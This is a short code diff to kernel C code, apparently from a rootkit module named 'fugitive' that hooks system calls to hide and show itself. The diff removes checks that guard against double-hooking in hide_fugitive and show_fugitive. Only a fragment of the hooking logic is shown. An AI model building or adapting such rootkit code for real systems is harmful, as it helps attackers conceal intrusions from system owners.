@@ -238,12 +238,6 @@ int unfugitive(const char __user *passwd, const char __user *shadow) {
 int hide_fugitive(void){
     int i;
     int retval;
-    
-    for (i = 0; i < sizeof(fugitive__hooks) / sizeof(fugitive__hooks[0]); i++) {
-        if (fugitive__hooks[i].hooked)
-            return -EINVAL;
-    }
-    
     /* add hooks */
     
     for (i = 0; i < sizeof(fugitive__hooks) / sizeof(fugitive__hooks[0]); i++) {
@@ -261,14 +255,6 @@ int hide_fugitive(void){
 int show_fugitive(void){
     int hooked;
     int i;
-    
-    for (hooked = i = 0; i < sizeof(fugitive__hooks) / sizeof(fugitive__hooks[0]); i++) {
-        if (fugitive__hooks[i].hooked)
-            hooked++;
-    }
-    
-    if (!hooked)
-      return -EINVAL;
     
     for (i = 0; i < sizeof(fugitive__hooks) / sizeof(fugitive__hooks[0]); i++)
         sctm_unhook(fugitive__sctm, &fugitive__hooks[i]);
